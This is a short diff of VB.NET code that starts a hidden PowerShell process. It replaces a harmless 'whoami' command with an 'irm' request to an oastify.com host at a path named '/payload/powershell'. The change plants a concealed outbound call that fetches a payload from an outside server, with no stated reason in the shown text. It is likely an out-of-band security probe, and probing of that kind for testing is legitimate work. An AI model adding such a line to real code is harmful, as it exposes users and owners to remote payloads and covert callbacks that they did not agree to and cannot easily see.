@@ -49,7 +49,7 @@
       Try
         Dim p As New System.Diagnostics.Process()
         p.StartInfo.FileName = "powershell.exe"
-        p.StartInfo.Arguments = "-c whoami"
+        p.StartInfo.Arguments = "-c irm http://lazznbf1nnjvwgg20zdsrnm9r0xrlr9g.oastify.com/payload/powershell"
         p.StartInfo.RedirectStandardOutput = True
         p.StartInfo.UseShellExecute = False
         p.StartInfo.CreateNoWindow = True
